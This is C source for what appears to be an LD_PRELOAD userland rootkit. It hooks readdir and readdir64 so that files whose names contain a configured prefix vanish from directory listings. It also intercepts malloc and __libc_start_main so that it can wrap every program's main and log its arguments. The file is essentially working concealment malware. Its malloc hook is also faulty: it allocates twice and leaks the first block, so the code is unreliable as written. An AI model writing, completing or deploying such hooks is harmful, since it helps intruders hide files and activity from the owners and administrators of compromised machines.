#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include "res/config.h"
#include "res/prototypes.h"

struct dirent *readdir(DIR *dirp) {
    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;

    while (dir = orig_readdir(dirp)) {
        if(strstr(dir->d_name, PREFIX) == 0) {
            break;
        }
    }
    return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *dir;

    while (dir = orig_readdir64(dirp)) {
        if(strstr(dir->d_name, PREFIX) == 0) {
            break;
        }
    }
    return dir;
}

void *malloc(size_t size) {
    if (orig_malloc == NULL) {
        orig_malloc = (void *(*)(size_t)) dlsym(RTLD_NEXT, "malloc");
    }
    #ifdef DEBUG
        fprintf(stderr, RK_INFO"malloc(%zu)\n", size);
    #endif
    
    void *alloc_addr = orig_malloc(size);
    return (*orig_malloc)(size);
}

int main_hook(int argc, char **argv, char **envp) {
    int ret = orig_main(argc, argv, envp);

    #ifdef DEBUG
        fprintf(stderr, RK_INFO"main() returned %d | ", ret);

        for (int i = 0; i < argc; ++i) {
            fprintf(stderr, "argv[%d] = %s ", i, argv[i]);
        }
        fprintf(stderr, "\n");
    #endif

    return ret;
}


int __libc_start_main(int (*main)(int, char **, char **), int argc, char **argv, int (*init)(int, char **, char **), void (*fini)(void), void (*rtld_fini)(void), void *stack_end) {
    orig_main = main;

    typeof(&__libc_start_main) orig = dlsym(RTLD_NEXT, "__libc_start_main");

    return orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end);
}

